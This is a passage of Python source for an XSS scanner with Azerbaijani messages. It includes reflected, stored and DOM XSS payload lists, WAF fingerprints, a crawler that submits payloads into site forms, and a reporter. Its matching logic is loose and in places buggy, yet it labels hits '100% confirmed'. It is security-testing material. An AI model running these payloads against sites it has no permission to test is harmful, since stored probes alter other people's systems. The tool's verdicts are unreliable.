class Payloads:
    REFLECTED = OrderedDict([
        ("html_body_tag",    '<script>window.__xss_p1="INJECTED_{uid}";</script>'),
        ("html_body_img",    '<img src=x onerror="window.__xss_p2=\'INJECTED_{uid}\'">'),
        ("html_body_svg",    '<svg onload="window.__xss_p3=String.fromCharCode(73,78,74,69,67,84,69,68,95,117,105,100)">'),
        ("html_body_body",   '<body onload="window.__xss_p4=\'INJECTED_{uid}\'">'),
        ("html_body_details", '<details open ontoggle="window.__xss_p5=\'INJECTED_{uid}\'">'),
        ("attr_js_handler",  '" onfocus="window.__xss_p6=\'INJECTED_{uid}\'" autofocus='),
        ("attr_onerror",     '" onerror="window.__xss_p7=\'INJECTED_{uid}\'" src=x'),
        ("attr_onmouseover", '" onmouseover="window.__xss_p8=\'INJECTED_{uid}\'" href=x'),
        ("js_string_single", "';window.__xss_p9='INJECTED_{uid}';//"),
        ("js_string_double", '";window.__xss_p10="INJECTED_{uid}";//'),
        ("js_backtick",      '` ;window.__xss_p11="INJECTED_{uid}";//'),
        ("html_entity_pct",  '%3Cscript%3Ewindow.__xss_p12%3D%27INJECTED_{uid}%27%3C%2Fscript%3E'),
        ("html_entity_hex",  '&#x3C;script&#x3E;window.__xss_p13&#x3D;&#x27;INJECTED_{uid}&#x27;&#x3C;&#x2F;script&#x3E;'),
        ("wav_bypass1",      '<img/src=x onerror=window.__xss_p15="INJECTED_{uid}">'),
        ("wav_bypass2",      '<svg/onload=window.__xss_p16="INJECTED_{uid}">'),
        ("direct_alert_tag", '"><script>alert(1)</script>'),
        ("direct_alert_img", '"><img src=x onerror=alert(1)>'),
        ("direct_alert_svg", '"><svg onload=alert(1)>'),
        ("direct_alert_attr", '" autofocus onfocus="alert(1)')
    ])

    STORED = OrderedDict([
        ("stored_breakout1", '"><script>window.__xss_s1="STORED_{uid}";</script>'),
        ("stored_breakout2", '"><img src=x onerror="window.__xss_s2=\'STORED_{uid}\'">'),
        ("stored_breakout3", '\'><svg onload="window.__xss_s3=\'STORED_{uid}\'">'),
        ("stored_breakout4", '" autofocus onfocus="window.__xss_s4=\'STORED_{uid}\''),
    ])

    DOM_BASED = OrderedDict([
        ("dom_hash",         "javascript:window.__xss_d1=document.location.hash"),
        ("dom_referrer",     "javascript:window.__xss_d2=document.referrer"),
        ("dom_location",     "javascript:window.__xss_d3=document.location"),
    ])

    @staticmethod
    def inject_uid(payload: str, uid: str) -> str:
        return payload.replace("{uid}", uid)

    @staticmethod
    def get_detection_markers(uid: str) -> list:
        return [
            f'INJECTED_{uid}',
            f'STORED_{uid}',
            f'__xss_p',
            f'__xss_s',
            f'__xss_d',
        ]

class WAFDetector:
    SIGNATURES = {
        "Cloudflare":   [b"cf-ray", b"cf-cache-status", b"__cf_bm", b"cloudflare"],
        "AWS WAF":     [b"aws-waf", b"x-amz-cf-id", b"waf-aws"],
        "Akamai":      [b"akamai", b"akamai-x"],
        "Sucuri":      [b"sucuri", b"x-sucuri-id"],
        "Imperva":     [b"imperva", b"incapsula"],
        "ModSecurity": [b"mod_security"],
        "Custom WAF":  [b"waf", b"blocked", b"access denied", b"403 forbidden"],
    }

    @classmethod
    def detect(cls, response_headers: dict, body: bytes) -> list:
        detected = []
        for waf_name, sigs in cls.SIGNATURES.items():
            for sig in sigs:
                for header_val in response_headers.values():
                    if isinstance(header_val, bytes) and sig.lower() in header_val.lower():
                        detected.append(waf_name)
                        break
                    elif isinstance(header_val, str) and sig.decode().lower() in header_val.lower():
                        detected.append(waf_name)
                        break
                if sig.lower() in body.lower():
                    if waf_name not in detected:
                        detected.append(waf_name)
        return list(set(detected))

class FalsePositiveFilter:
    @classmethod
    def filter_false_positives(cls, url: str, param: str, payload: str, html: str, marker: str) -> tuple:
        if marker not in html:
            return False, "Marker tapılmadı"

        # Meta və ya kommentariya içindədirsə false positive say
        meta_match = re.search(rf'<meta[^>]+content="[^"]*{re.escape(marker)}[^"]*"', html, re.IGNORECASE)
        if meta_match:
            return False, "False Positive: Payload meta tag içindədir"

        comment_match = re.search(rf'<!--.*?{re.escape(marker)}.*?-->', html, re.DOTALL | re.IGNORECASE)
        if comment_match:
            return False, "False Positive: Payload HTML comment içindədir"

        # Tamamilə HTML entity olaraq escape olunubsa
        if '&quot;' in html or '&gt;' in html or '&lt;' in html:
            encoded_check = payload.replace('"', '&quot;').replace('>', '&gt;').replace('<', '&lt;')
            if encoded_check in html and marker not in html.replace(encoded_check, ''):
                return False, "False Positive: Input HTML Entity olaraq escape olunub"

        # Aktiv icra kontekstinin yoxlanılması (script və ya event handler)
        is_executable = False
        for event in ['onerror', 'onload', 'onfocus', 'ontoggle', 'onmouseover', 'onclick']:
            if f'{event}=' in html.lower() and marker in html:
                is_executable = True
                break
        
        if '<script>' in html.lower() and marker in html:
            is_executable = True

        if not is_executable:
            return False, "False Positive: Aktiv icra konteksti (script/event) tapılmadı"

        return True, "100% Təsdiqlənmiş XSS Zəifliyi"

class SmartCrawler:
    def __init__(self, session: aiohttp.ClientSession, base_url: str, max_depth: int = 2, max_pages: int = 30):
        self.session = session
        self.base_url = base_url
        self.max_depth = max_depth
        self.max_pages = max_pages
        self.visited = set()
        self.endpoints = []
        self.forms = []
        self.parsed_base = urllib.parse.urlparse(base_url)

    async def crawl(self):
        await self._crawl_recursive(self.base_url, depth=0)
        return self.endpoints, self.forms

    async def _crawl_recursive(self, url: str, depth: int):
        if depth > self.max_depth or len(self.visited) >= self.max_pages:
            return
        if url in self.visited:
            return
        self.visited.add(url)

        try:
            async with self.session.get(url, timeout=aiohttp.ClientTimeout(total=10), allow_redirects=True) as resp:
                if resp.status != 200:
                    return
                content_type = resp.headers.get('Content-Type', '')
                if 'text/html' not in content_type:
                    return
                body = await resp.text()
        except Exception:
            return

        soup = BeautifulSoup(body, 'html.parser')

        for a_tag in soup.find_all('a', href=True):
            href = a_tag['href']
            full = urllib.parse.urljoin(url, href)
            parsed = urllib.parse.urlparse(full)
            if parsed.netloc != self.parsed_base.netloc:
                continue
            if parsed.query:
                params = urllib.parse.parse_qs(parsed.query)
                self.endpoints.append((full, 'GET', params))
            if depth < self.max_depth - 1:
                asyncio.create_task(self._crawl_recursive(full, depth + 1))

        for form in soup.find_all('form'):
            action = form.get('action', '')
            form_url = urllib.parse.urljoin(url, action)
            method = (form.get('method') or 'get').upper()
            fields = {}
            for inp in form.find_all(['input', 'textarea', 'select']):
                name = inp.get('name')
                if not name:
                    continue
                input_type = inp.get('type', 'text').lower()
                if input_type in ('submit', 'image', 'button', 'reset'):
                    continue
                fields[name] = 'TEST_VALUE'
            if fields:
                self.forms.append((form_url, method, fields))

    async def discover_endpoints_from_forms(self):
        for form_url, method, fields in self.forms:
            if method == 'GET':
                query = urllib.parse.urlencode(fields, doseq=True)
                full = f"{form_url}?{query}"
                parsed = urllib.parse.urlparse(full)
                params = urllib.parse.parse_qs(parsed.query)
                self.endpoints.append((full, 'GET', params))

class XSSTester:
    def __init__(self, session: aiohttp.ClientSession, target: str, concurrency: int = 12):
        self.session = session
        self.target = target
        self.concurrency = concurrency
        self.semaphore = asyncio.Semaphore(concurrency)
        self.uid = hashlib.md5(f"{target}{datetime.now().isoformat()}".encode()).hexdigest()[:8]
        self.results = []
        self.total_tests = 0
        self.completed = 0
        self.waf_detected = []

    async def scan(self):
        await self._detect_waf()
        print(f"{C.CYAN}[*] Smart Crawler işləyir — səhifələr toplanır...{C.RESET}")
        crawler = SmartCrawler(self.session, self.target, max_depth=2, max_pages=30)
        endpoints, forms = await crawler.crawl()
        await crawler.discover_endpoints_from_forms()

        if not endpoints and not forms:
            print(f"{C.YELLOW}[!] Parametr və ya forma tapılmadı, birbaşa hədəfin özü yoxlanılır...{C.RESET}")
            parsed_target = urllib.parse.urlparse(self.target)
            if parsed_target.query:
                endpoints.append((self.target, 'GET', urllib.parse.parse_qs(parsed_target.query)))
            else:
                endpoints.append((self.target, 'GET', {'q': 'TEST'}))

        print(f"{C.GREEN}[+] {len(endpoints)} endpoint və {len(forms)} forma analiz üçün hazırdır.{C.RESET}")

        print(f"{C.CYAN}[*] MƏRHƏLƏ 1: Reflected XSS Skanı{C.RESET}")
        get_tasks = []
        for url, method, params in endpoints:
            for param_name in params:
                for ptype, payload_template in Payloads.REFLECTED.items():
                    payload = Payloads.inject_uid(payload_template, self.uid)
                    get_tasks.append(self._test_get(url, param_name, payload, ptype, 'REFLECTED'))

        print(f"{C.CYAN}[*] MƏRHƏLƏ 2: Stored / Form XSS Skanı{C.RESET}")
        stored_tasks = []
        for form_url, method, fields in forms:
            for field_name in fields:
                for ptype, payload_template in Payloads.STORED.items():
                    payload = Payloads.inject_uid(payload_template, self.uid)
                    stored_tasks.append(self._test_form(form_url, method, field_name, payload, ptype, 'STORED'))

        print(f"{C.CYAN}[*] MƏRHƏLƏ 3: DOM-based XSS Skanı{C.RESET}")
        dom_tasks = []
        for url, method, params in endpoints:
            for ptype, payload_template in Payloads.DOM_BASED.items():
                payload = Payloads.inject_uid(payload_template, self.uid)
                dom_tasks.append(self._test_dom(url, payload, ptype))

        all_tasks = get_tasks + stored_tasks + dom_tasks
        self.total_tests = len(all_tasks)
        print(f"{C.CYAN}[*] Cəmi {self.total_tests} hücum vektoru yoxlanılır...{C.RESET}\n")

        print_progress(0, self.total_tests)
        for coro in asyncio.as_completed(all_tasks):
            result = await coro
            if result:
                self.results.append(result)
            self.completed += 1
            if self.completed % 5 == 0 or self.completed == self.total_tests:
                print_progress(self.completed, self.total_tests)

    async def _detect_waf(self):
        try:
            async with self.session.get(self.target, timeout=8) as resp:
                body = await resp.read()
                self.waf_detected = WAFDetector.detect(dict(resp.headers), body)
                if self.waf_detected:
                    print(f"{C.YELLOW}[!] WAF/CMS aşkarlandı: {', '.join(self.waf_detected)}{C.RESET}")
        except Exception:
            pass

    async def _test_get(self, url: str, param: str, payload: str, ptype: str, xss_type: str):
        async with self.semaphore:
            try:
                parsed = urllib.parse.urlparse(url)
                qparams = urllib.parse.parse_qs(parsed.query)
                qparams[param] = [payload]
                new_query = urllib.parse.urlencode(qparams, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                async with self.session.get(test_url, timeout=8, allow_redirects=False) as resp:
                    body = await resp.text()

                for marker in Payloads.get_detection_markers(self.uid):
                    valid, reason = FalsePositiveFilter.filter_false_positives(test_url, param, payload, body, marker)
                    if valid:
                        return {
                            'type': xss_type, 'url': test_url, 'param': param,
                            'payload': payload, 'payload_type': ptype, 'method': 'GET',
                            'status': resp.status, 'waf': self.waf_detected, 'marker': marker, 'reason': reason
                        }
            except Exception:
                pass
            return None

    async def _test_form(self, url: str, method: str, field: str, payload: str, ptype: str, xss_type: str):
        async with self.semaphore:
            try:
                data = {field: payload}
                if method == 'POST':
                    async with self.session.post(url, data=data, timeout=8, allow_redirects=False) as resp:
                        body = await resp.text()
                else:
                    new_query = urllib.parse.urlencode(data, doseq=True)
                    test_url = f"{url}&{new_query}" if '?' in url else f"{url}?{new_query}"
                    async with self.session.get(test_url, timeout=8, allow_redirects=False) as resp:
                        body = await resp.text()

                for marker in Payloads.get_detection_markers(self.uid):
                    valid, reason = FalsePositiveFilter.filter_false_positives(url, field, payload, body, marker)
                    if valid:
                        return {
                            'type': xss_type, 'url': url, 'param': field,
                            'payload': payload, 'payload_type': ptype, 'method': method,
                            'status': resp.status, 'waf': self.waf_detected, 'marker': marker, 'reason': reason
                        }
            except Exception:
                pass
            return None

    async def _test_dom(self, url: str, payload: str, ptype: str):
        async with self.semaphore:
            try:
                test_url = f"{url}#{payload}"
                async with self.session.get(test_url, timeout=8, allow_redirects=False) as resp:
                    body = await resp.text()

                for marker in Payloads.get_detection_markers(self.uid):
                    valid, reason = FalsePositiveFilter.filter_false_positives(test_url, 'fragment', payload, body, marker)
                    if valid:
                        return {
                            'type': 'DOM-BASED', 'url': test_url, 'param': '#fragment',
                            'payload': payload, 'payload_type': ptype, 'method': 'GET (fragment)',
                            'status': resp.status, 'waf': self.waf_detected, 'marker': marker, 'reason': reason
                        }
            except Exception:
                pass
            return None

class Reporter:
    def __init__(self, results: list, target: str, waf: list):
        self.results = results
        self.target = target
        self.waf = waf

    def print_report(self):
        print(f"\n{'='*60}")
        print(f"{C.BOLD}{C.CYAN}    XSS SCAN NƏTİCƏLƏRİ (v9.2 PRO)    {C.RESET}")
        print(f"  Hədəf      : {self.target}")
        print(f"  Vaxt       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        if self.waf:
            print(f"  WAF/CMS    : {', '.join(self.waf)}")
        print(f"  Nəticə     : {len(self.results)} zəiflik aşkarlandı\n")

        if not self.results:
            print(f"  {C.GREEN}[✓] Heç bir XSS zəifliyi tapılmadı (Təhlükəsizdir).{C.RESET}\n")
            return

        for i, r in enumerate(self.results, 1):
            print(f"  {C.RED}[{i}] {r['type']} XSS{C.RESET}")
            print(f"      Parametr : {C.WHITE}{r['param']}{C.RESET}")
            print(f"      URL      : {C.DIM}{r['url']}{C.RESET}")
            print(f"      Payload  : {C.YELLOW}{r['payload']}{C.RESET}")
            print(f"      Status   : {C.GREEN}{r['reason']}{C.RESET}")
            print()
        print(f"{'='*60}")

    def save_json(self, filename: str):
        report = {'target': self.target, 'timestamp': datetime.now().isoformat(), 'vulnerabilities': self.results}
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        print(f"{C.GREEN}[+] JSON hesabat yadda saxlanıldı: {filename}{C.RESET}")

def print_progress(iteration: int, total: int):
    if total == 0:
        return
    pct = 100.0 * iteration / total
    filled = int(40 * iteration // total)
    bar = '█' * filled + '░' * (40 - filled)
    sys.stdout.write(f'\r  {C.CYAN}Skan: |{bar}| {pct:.1f}% ({iteration}/{total}){C.RESET}')
    sys.stdout.flush()
    if iteration == total:
        print()

